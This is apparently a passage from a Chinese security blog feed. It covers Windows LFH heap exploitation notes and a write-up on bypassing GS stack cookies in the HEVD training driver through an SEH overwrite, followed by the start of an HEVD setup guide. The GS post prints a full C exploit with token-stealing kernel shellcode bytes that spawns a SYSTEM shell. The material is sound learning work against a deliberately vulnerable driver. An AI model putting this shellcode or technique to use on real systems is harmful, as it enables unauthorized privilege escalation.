即该index对应的chunk是busy的, 那么往后取最近的</p><p>细节上, 就是检查index对应到的bitmap是否为0, 如果是0就返回对应的bitmap, 否则选取最近的下一个</p></li><li><p>如果没有发生, 则继续往下</p></li></ul></li><li><p>检查<code>chunk-&gt;UnusedBytes &amp; 0x3F != 0</code>, 因为满足此式表示chunk是free状态的, 否则状态非法</p><p>该过程中还会设置对应的bitmap, 以及更新<code>ActiveSubsegment-&gt;AggregateExchg.depth</code>等相关信息</p></li><li><p>最后设置index(即<code>chunk-&gt;PreviousSize</code>)以及<code>chunk-&gt;UnusedBytes</code>, 并把chunk返回给用户</p></li></ol><h4 id="释放-1"><a href="#释放-1" class="headerlink" title="释放"></a>释放</h4><ol><li>首先更新<code>chunk-&gt;UnusedBytes = 0x80</code></li><li>找到该chunk对应的在<code>UserBlocks</code>中的index，并且置<code>UserBlocks-&gt;BusyBitmap</code>对应的bit为0</li><li>更新<code>ActiveSubsegment-&gt;AggregateExchg</code></li><li>如果该chunk不属于当前的<code>ActiveSubsegment</code>则看能不能放进<code>CachedItems</code>中去, 如果可以就放进去</li></ol><h3 id="LFH-Exploitation"><a href="#LFH-Exploitation" class="headerlink" title="LFH-Exploitation"></a>LFH-Exploitation</h3><p>假如拥有UAF的漏洞可以利用, 但是因为LFH分配的随机性, 无法预测下一个分配出的chunk是在哪个位置, 也就是说现在我们free的chunk, 下一次malloc不一定拿得到</p><p>那么此时可以通过拿空<code>UserBlocks</code>的方式(也就是使这个UserBlocks的chunk全部处于busy), 再free掉目标chunk, 这样下一次malloc就必然会拿到目标chunk(因为只有一个可用)</p><p>再之后利用这个特性进一步利用</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="SCTF2020-EasyWinHeap"><a href="#SCTF2020-EasyWinHeap" class="headerlink" title="SCTF2020-EasyWinHeap"></a>SCTF2020-EasyWinHeap</h2>]]></content>
    
    
    <summary type="html">heap again</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="winheap" scheme="https://ixout.github.io/tags/winheap/"/>
    
  </entry>
  
  <entry>
    <title>[HEVD]enable GS</title>
    <link href="https://ixout.github.io/posts/13921/"/>
    <id>https://ixout.github.io/posts/13921/</id>
    <published>2025-02-17T09:42:34.000Z</published>
    <updated>2025-02-18T02:59:48.238Z</updated>
    
    <content type="html"><![CDATA[<p>接下来要面对的就是开启了gs保护的栈溢出了</p><h1 id="gs保护"><a href="#gs保护" class="headerlink" title="gs保护"></a>gs保护</h1><p>gs保护其实就类似linux下的canary保护,都是在函数返回前校验原先存储在栈上的特殊值是否被修改,以此判断是否遭受了溢出攻击</p><p>程序启动时系统会随机生成一个cookie值,并将这个值的副本保存在<code>.data</code>段的开头</p><p>每个函数开始执行时都会将该值与栈指针寄存器异或并保存在栈中,返回时再次与栈指针寄存器异或检查一致</p><p>上一次目标关闭了gs保护(通过<code>__declspec</code>关键字)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__declspec(safebuffers)</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">TriggerBufferOverflowStack</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID UserBuffer,</span></span><br><span class="line"><span class="params">    _In_ SIZE_T Size</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure><p>而这一次不再关闭</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">TriggerBufferOverflowStackGS</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID UserBuffer,</span></span><br><span class="line"><span class="params">    _In_ SIZE_T Size</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure><h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><p>在32位下,绕过gs常用的办法是利用SEH机制,这个在以前的文章已经介绍过了,不再着重介绍</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    EXCEPTION_REGISTRATION_RECORD* Next; <span class="comment">// 指向下一个 SEH 节点的指针</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;         <span class="comment">// 异常处理函数的地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们要做的就是覆盖Handler字段,并在触发gs检查之前先触发异常</p><p>还是看栈结构</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-02-18_102946.png" alt=""></p><p>红色圈起来的部分上面就是seh handler,下面则是返回地址</p><p>在修改handler后,我们就需要触发异常,选择的办法就是利用memcpy触发,就是将我们的payload放置在一个单独页的尾部,然后给出的size超过这个页,使得触发非法访问异常</p><p>我们要覆盖的就是handler,距离是<code>aa8 - 894 = 214</code></p><p>让我们看exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HACKSYS_HEVD_IOCTL_STACK_OVERFLOW_GS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KTHREAD_OFFSET     0x124  <span class="comment">// nt!_KPCR.PcrbData.CurrentThread</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPROCESS_OFFSET    0x050  <span class="comment">// nt!_KTHREAD.ApcState.Process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PID_OFFSET         0x0B4  <span class="comment">// nt!_EPROCESS.UniqueProcessId</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLINK_OFFSET       0x0B8  <span class="comment">// nt!_EPROCESS.ActiveProcessLinks.Flink</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOKEN_OFFSET       0x0F8  <span class="comment">// nt!_EPROCESS.Token</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSTEM_PID         0x004  <span class="comment">// SYSTEM Process PID</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHARED_MEMORY_NAME <span class="string">&quot;HackSysExtremeVulnerableDriverSharedMemory&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span></span></span><br><span class="line"><span class="comment">// token-stealing shellcode taken from hasherezade&#x27;s PoC</span></span><br><span class="line"><span class="comment">// stub taken from https://klue.github.io/blog/2017/09/hevd_stack_gs/ this write up (found the same stack offsets manually earlier), rewrote it to AT&amp;T, generated opcodes, tested</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> kShellcode[] = &#123;</span><br><span class="line"><span class="comment">/* token-stealing code:</span></span><br><span class="line"><span class="comment"> 0:   60                      pusha</span></span><br><span class="line"><span class="comment"> 1:   64 a1 24 01 00 00       mov    %fs:0x124,%eax</span></span><br><span class="line"><span class="comment"> 7:   8b 40 50                mov    0x50(%eax),%eax</span></span><br><span class="line"><span class="comment"> a:   89 c1                   mov    %eax,%ecx</span></span><br><span class="line"><span class="comment"> c:   ba 04 00 00 00          mov    $0x4,%edx</span></span><br><span class="line"><span class="comment">11:   8b 80 b8 00 00 00       mov    0xb8(%eax),%eax</span></span><br><span class="line"><span class="comment">17:   2d b8 00 00 00          sub    $0xb8,%eax</span></span><br><span class="line"><span class="comment">1c:   39 90 b4 00 00 00       cmp    %edx,0xb4(%eax)</span></span><br><span class="line"><span class="comment">22:   75 ed                   jne    0x11</span></span><br><span class="line"><span class="comment">24:   8b 90 f8 00 00 00       mov    0xf8(%eax),%edx</span></span><br><span class="line"><span class="comment">2a:   8b b9 f8 00 00 00       mov    0xf8(%ecx),%edi</span></span><br><span class="line"><span class="comment">30:   83 e2 f8                and    $0xfffffff8,%edx</span></span><br><span class="line"><span class="comment">33:   83 e7 07                and    $0x7,%edi</span></span><br><span class="line"><span class="comment">36:   01 fa                   add    %edi,%edx</span></span><br><span class="line"><span class="comment">38:   89 91 f8 00 00 00       mov    %edx,0xf8(%ecx)</span></span><br><span class="line"><span class="comment">3e:   61                      popa</span></span><br><span class="line"><span class="comment">3f:   31 c0                   xor    %eax,%eax</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x64</span>, <span class="number">0xA1</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>,</span><br><span class="line"><span class="number">0xBA</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2D</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x90</span>, <span class="number">0xB4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0xED</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0xF8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0xB9</span>, <span class="number">0xF8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x83</span>, <span class="number">0xE7</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0xFA</span>, <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xF8</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>,</span><br><span class="line"><span class="comment">/* now, kernel clean return stub:</span></span><br><span class="line"><span class="comment">mov (esp+0x78c), %edi</span></span><br><span class="line"><span class="comment">mov (esp+0x790), %esi</span></span><br><span class="line"><span class="comment">mov (esp+0x794), %ebx</span></span><br><span class="line"><span class="comment">add $0x9b8, %esp</span></span><br><span class="line"><span class="comment">pop %ebp</span></span><br><span class="line"><span class="comment">ret $0x8</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0xbc</span>, <span class="number">0x24</span>, <span class="number">0x8c</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>, <span class="number">0xb4</span>, <span class="number">0x24</span>, <span class="number">0x90</span>, <span class="number">0x07</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>, <span class="number">0x9c</span>, <span class="number">0x24</span>, <span class="number">0x94</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x81</span>, <span class="number">0xc4</span>, <span class="number">0xb8</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5d</span>, <span class="number">0xc2</span>, <span class="number">0x08</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> kDevName[] = <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>;</span><br><span class="line"></span><br><span class="line">HANDLE <span class="title function_">open_device</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* device_name)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE device = CreateFileA(device_name,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> device;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">close_device</span><span class="params">(HANDLE device)</span></span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(device);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">send_ioctl</span><span class="params">(HANDLE device, DWORD ioctl_code)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Payatu&#x27;s official HEVD exploit code instead</span></span><br><span class="line"><span class="comment">// For now let&#x27;s go with Payatu&#x27;s code ;]</span></span><br><span class="line">ULONG BytesReturned;</span><br><span class="line">SIZE_T PageSize = <span class="number">0x1000</span>; <span class="comment">// 4096</span></span><br><span class="line">HANDLE Sharedmemory = <span class="literal">NULL</span>;</span><br><span class="line">PVOID MemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">PVOID SuitableMemoryForBuffer = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID SharedMappedMemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T SeHandlerOverwriteOffset = <span class="number">0x214</span>; <span class="comment">// 532, this our payload length, we put it in the last 532 bytes of a 4096-byte (one page) memory block</span></span><br><span class="line"><span class="comment">// A*512 + DWORD XORED COOKIE + 3 DWORD JUNKS + DWORD SE HANDLER = 512+4+12+4 = 532</span></span><br><span class="line"><span class="comment">// deliberately, so reading past this range will cause an exception in kernel mode, which in turn should trigger the SEH handler we just overwrote</span></span><br><span class="line">LPCTSTR SharedMemoryName = (LPCSTR)SHARED_MEMORY_NAME;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the device handle</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] Creating Shared Memory\n&quot;</span>);</span><br><span class="line"><span class="comment">// Create the shared memory</span></span><br><span class="line">Sharedmemory = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, PageSize, SharedMemoryName); <span class="comment">// Create a 4KB mapping</span></span><br><span class="line"><span class="keyword">if</span> (!Sharedmemory) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[-] Failed To Create Shared Memory: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[+] Shared Memory Handle: 0x%p\n&quot;</span>, Sharedmemory);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] Mapping Shared Memory To Current Process Space\n&quot;</span>);</span><br><span class="line"><span class="comment">// Map the shared memory in the process space of this process</span></span><br><span class="line">SharedMappedMemoryAddress = MapViewOfFile(Sharedmemory, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, PageSize); <span class="comment">// Mapped view of file - a virtual address in user space, one page 4KB</span></span><br><span class="line"><span class="keyword">if</span> (!SharedMappedMemoryAddress) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[-] Failed To Map Shared Memory: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[+] Mapped Shared Memory: 0x%p\n&quot;</span>, SharedMappedMemoryAddress);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SuitableMemoryForBuffer = (PVOID)((ULONG)SharedMappedMemoryAddress + (ULONG)(PageSize - SeHandlerOverwriteOffset)); <span class="comment">// set this to 3564-th byte, the beginning of our payload</span></span><br><span class="line"><span class="comment">// e.g. 0x1000 (4096) + (4096 - 532 = 3564), which means that our payload (A*512+DWORD (COOKIE) + 3 DWORDS (JUNK) + DWORD (EIP SEHANDLER)) MUST START HERE</span></span><br><span class="line"><span class="comment">// so our payload should be 532-bytes long</span></span><br><span class="line"><span class="comment">// and reading past it will cause reading past the 4096 byte-long SharedMappedMemoryAddress - and cause an exception while in kernel mode</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] Suitable Memory For Buffer: 0x%p\n&quot;</span>, SuitableMemoryForBuffer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] Preparing Buffer Memory Layout\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">RtlFillMemory(SharedMappedMemoryAddress, PageSize, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">MemoryAddress = (PVOID)((ULONG)SuitableMemoryForBuffer + <span class="number">0x210</span>); <span class="comment">// SE handler</span></span><br><span class="line">*(PULONG)MemoryAddress = (ULONG)kShellcode;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[+] SE Handler Value: 0x%p\n&quot;</span>, *(PULONG)MemoryAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[+] SE Handler Address: 0x%p\n&quot;</span>, MemoryAddress);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] EoP Payload: 0x%p\n&quot;</span>, kShellcode); <span class="comment">// kShellcode</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[+] Triggering Kernel Stack Overflow GS\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[+] Making the driver read from usermode %x to %x.\n&quot;</span>, (ULONG)SuitableMemoryForBuffer, (ULONG)((ULONG)SuitableMemoryForBuffer + (ULONG)SeHandlerOverwriteOffset));</span><br><span class="line">OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"><span class="comment">// RAISE_EXCEPTION_IN_KERNEL_MODE is just a predefined constant (0x4) || NOW DEBUG AGAIN (WITHOUT 0x4 OFFSET) TO SEE IF WE OVERWRITE THE RIGHT POINTERS IN MEMORY (before we hit the canary-checking function, we can see this with a breakpoint right after memcpy call)</span></span><br><span class="line">DeviceIoControl(device, ioctl_code, (LPVOID)SuitableMemoryForBuffer, (DWORD)SeHandlerOverwriteOffset + <span class="number">0x4</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, &amp;BytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// Debugger entered on first try; Bugcheck callbacks have not been invoked.</span></span><br><span class="line">OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE dev = open_device(kDevName);</span><br><span class="line"><span class="keyword">if</span> (dev == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">send_ioctl(dev, HACKSYS_HEVD_IOCTL_STACK_OVERFLOW_GS);</span><br><span class="line">close_device(dev);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>); <span class="comment">// we should be SYSTEM now, spawn cmd.exe</span></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之前普通的栈溢出差别在于</p><ol><li><p>通过 <code>CreateFileMapping</code> 和 <code>MapViewOfFile</code> 申请 4KB <strong>用户态</strong> 共享内存。</p><p>并将payload放置在共享内存的尾部位置,偏移是<code>0x1000 - 0x214 = 0xdec</code></p></li><li><p>触发DeviceIoControl时,传入一个使得memcpy会在复制完payload后会继续访问不存在地址的size,使得memcpy触发异常,进入shellcode的执行</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-02-18_105413.png" alt=""></p><p>可以看到handler已经被修改为shellcode的地址,但不知道为什么触发异常以后并没有执行这个handler,奇怪</p><h1 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h1><p>32 位系统的 SEH 信息保存在栈中,然而64位的SEH保存在一个表结构中, 这就意味着我们没法通过覆盖SEH来做到漏洞利用</p>]]></content>
    
    
    <summary type="html">ddddd</summary>
    
    
    
    <category term="bin" scheme="https://ixout.github.io/categories/bin/"/>
    
    
    <category term="HEVD" scheme="https://ixout.github.io/tags/HEVD/"/>
    
  </entry>
  
  <entry>
    <title>[HEVD]栈溢出与windows提权</title>
    <link href="https://ixout.github.io/posts/16788/"/>
    <id>https://ixout.github.io/posts/16788/</id>
    <published>2025-01-13T12:15:31.000Z</published>
    <updated>2025-02-17T09:45:14.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>环境的准备较为简单</p><h2 id="被调试方"><a href="#被调试方" class="headerlink" title="被调试方"></a>被调试方</h2><p>之前学linux内核使用的是qemu仿真,对于windows来说就不那么适合了,所以还是在vmware中增加一个虚拟机</p><p>HEVD提供了x32和x64的版本,我们也准备两个被调试环境,分别是win7_x32和win10_x64(win11_x64也行)</p><p>之所以要两个环境主要是因为win7_x32的保护机制更少,便于我们直接关注漏洞的本质,但win7_x32已经太过久远所以我们也许还要在一些较新的版本上验证我们的攻击有效</p><p>构建调试环境参考博客<a href="https://blog.csdn.net/weixin_43790779/article/details/115873938">WinDbg 双机调试（调试机为Windows10系统，被调试机为Windows7系统）</a></p><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><ol><li>KmdManager,用于加载驱动</li><li>visual studio,exp编写</li><li>DebugView,在被调试方也显示内核调试信息</li><li>windbg</li><li>virtualKD-redux,windows内核调试神器,如果受不了windbg正常调试时的逆天延迟,推荐该工具</li></ol><h1 id="熟悉HEVD"><a href="#熟悉HEVD" class="headerlink" title="熟悉HEVD"></a>熟悉HEVD</h1><p>HEVD（HackSys Extreme Vulnerable Driver）是一个专为内核安全学习设计的漏洞驱动程序，由HackSys Team开发。它故意引入了多种常见内核漏洞（如栈溢出、堆溢出、UAF等），供学习者分析和利用</p><p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">hacksysteam/HackSysExtremeVulnerableDriver：HackSys Extreme Vulnerable Driver (HEVD) - Windows &amp; Linux </a></p><h2 id="驱动装载"><a href="#驱动装载" class="headerlink" title="驱动装载"></a>驱动装载</h2><p>下载release中已经编译好的驱动</p><p>管理员身份打开DebugView并勾选如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213907.png" alt=""></p><p>管理员身份打开KmdManager,选择带有漏洞的x86版本驱动加载</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213425.png" alt=""></p><p>注意,只有在被调试器附加的情况下,驱动才能成功加载</p><p>成功加载时就能在windbg或Debugview中看到banner了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213953.png" alt=""></p><p>在windbg中使用命令<code>lm m H*</code>也能看到其已经成功加载</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214058.png" alt=""></p><p>此时驱动是尚未加载符号的</p><p>使用命令确认符号加载路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!sym noisy</span><br><span class="line">x /D HEVD!</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214656.png" alt=""></p><p>那么创建<code>符号文件路径\HEVD.pdb\XXXXXXX</code>路径,并将下载的pdb文件移动到此处</p><p><code>.reload</code>重新加载后再次执行命令<code>x /D HEVD!</code>,即可查看HEVD的所有符号</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214957.png" alt=""></p><p><code>!drvobj HEVD 2</code>查看驱动详细信息</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_215318.png" alt=""></p><h2 id="样例exp"><a href="#样例exp" class="headerlink" title="样例exp"></a>样例exp</h2><p>让我们尝试运行仓库提供的exp查看能否成功提权</p><p>克隆仓库, vs studio打开exploit目录下的项目文件</p><p>选择release版本编译生成,获得exp样例,</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_215748.png" alt=""></p><p>使用命令<code>HackSysEVDExploit.exe -c cmd.exe -s</code>测试</p><p>成功提权</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_220207.png" 